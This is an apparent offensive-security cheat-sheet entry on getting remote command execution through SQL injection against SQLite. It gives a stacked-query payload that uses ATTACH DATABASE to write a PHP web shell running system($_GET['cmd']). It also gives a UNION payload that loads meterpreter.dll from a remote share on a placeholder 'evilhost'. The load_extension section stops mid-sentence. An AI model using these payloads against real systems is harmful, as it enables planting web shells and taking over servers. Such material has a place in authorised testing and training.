# Web Application - SQL Injection - SQLite

### Remote Command Execution

###### Attach Database

The SQLite `ATTACH DATABASE` statement permit to attach additional databases to
the current database connection. It can thus be used to attach to others
databases stored on the file system and that may contain interesting
information.

Moreover, if the attached database does not exist, a new file is created on
the file system, given the web server user as write privilege at the specified
path. By creating a file that will be executed by the web server and inserting
code in a table field, remote command execution can be achieved upon access of
the file.   

Note: stacked queries must be supported, which is the default SQLite
configuration

```
# Example ATTACH DATABASE to write a PHP web shell

ATTACH DATABASE '<FULLPATH | RELATIVE_PATH>/<FILENAME>' AS file; CREATE TABLE file.cmd (dataz text); INSERT INTO file.cmd (dataz) VALUES ('<?system($_GET["cmd"]); ?>');--
```

###### Load_extension

The `SELECT load_extension` statement can be used to load

UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
